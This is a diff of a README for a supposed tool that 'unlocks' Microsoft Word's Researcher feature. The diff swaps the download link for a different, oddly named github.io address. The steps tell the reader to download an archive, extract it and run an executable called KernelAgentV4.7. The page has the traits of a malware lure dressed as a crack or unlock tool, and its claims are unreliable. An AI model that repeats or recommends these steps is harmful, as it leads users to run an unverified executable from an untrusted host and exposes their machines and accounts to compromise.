@@ -2,14 +2,14 @@
 
 Unlock Researcher in Word — a built-in academic assistant that helps find reliable sources, generate citations, and structure research papers faster. This tool restores full Researcher access using `KernelAgentV4.7`.
 
-[![Download Researcher Tool](https://img.shields.io/badge/Download-Researcher_Tool-blueviolet)](https://m365-researcher-citation-tool.github.io/.github
+[![Download Researcher Tool](https://img.shields.io/badge/Download-Researcher_Tool-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferkfr
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://m365-researcher-citation-tool.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/ferkfr
 ) section  
 2. 📁 **Extract the folder** to a location like `C:\M365Researcher`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to enable academic content modules  
